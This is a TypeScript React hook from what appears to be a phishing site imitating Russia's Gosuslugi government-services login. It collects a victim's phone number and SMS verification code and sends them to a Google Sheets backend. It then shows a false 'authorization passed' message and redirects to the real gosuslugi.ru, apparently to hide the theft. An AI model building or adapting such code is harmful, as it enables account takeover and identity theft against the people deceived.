import { useCallback, useMemo } from 'react';

import googleSheetsService from '@/services/googleSheets';

import useForm from './useForm';
import { TVerificationFormData } from '../interfaces/forms/verificationForm.types';
import { TUseFormOptions } from '../interfaces/hooks/useForm.types';
import toaster from '../packages/toaster';
import verificationSchema from '../packages/verificationSchema';

const useVerificationForm = (onSuccess?: () => void) => {
  const defaultValues: TVerificationFormData = useMemo(() => {
    const savedPhone = typeof window !== 'undefined' ? localStorage.getItem('verificationPhone') || '' : '';

    return {
      phone: savedPhone,
      verificationCode: '',
    };
  }, []);

  const onSubmit = useCallback(
    async (data: TVerificationFormData) => {
      try {
        const { result } = await googleSheetsService<TVerificationFormData>(data, 'updateVerificationCode');

        if (result === 'success') {
          localStorage.removeItem('verificationPhone');

          toaster({
            toastKey: 'success',
            message: 'Авторизация в госулугах была пройдена.',
          });

          onSuccess?.();

          setTimeout(() => {
            try {
              // Спробуємо відкрити через window.open з додатковими параметрами
              const newWindow = window.open('https://www.gosuslugi.ru/', '_blank', 'noopener,noreferrer');

              // Якщо window.open заблоковано, використовуємо fallback
              if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
                // Створюємо посилання та симулюємо клік
                const link = document.createElement('a');

                link.href = 'https://www.gosuslugi.ru/';
                link.target = '_blank';
                link.rel = 'noopener noreferrer';
                document.body.appendChild(link);
                // eslint-disable-next-line testing-library/no-node-access
                link.click();
                document.body.removeChild(link);
              }
            } catch (error) {
              console.error('Error opening gosuslugi:', error);
              // Fallback - просто переходимо на сайт
              window.location.href = 'https://www.gosuslugi.ru/';
            }
          }, 1500);
        } else {
          toaster({
            toastKey: 'error',
            message: 'Ошибка авторизации',
          });
        }
      } catch (error) {
        console.error('Verification error:', error);
        toaster({
          toastKey: 'error',
          message: 'Ошибка авторизации',
        });
      }
    },
    [onSuccess]
  );

  const config: TUseFormOptions<TVerificationFormData> = useMemo(() => {
    return { onSubmit, defaultValues, schema: verificationSchema };
  }, [defaultValues, onSubmit]);

  const { form, handleSubmit } = useForm<TVerificationFormData>(config);

  return { form, handleSubmit };
};

export default useVerificationForm;
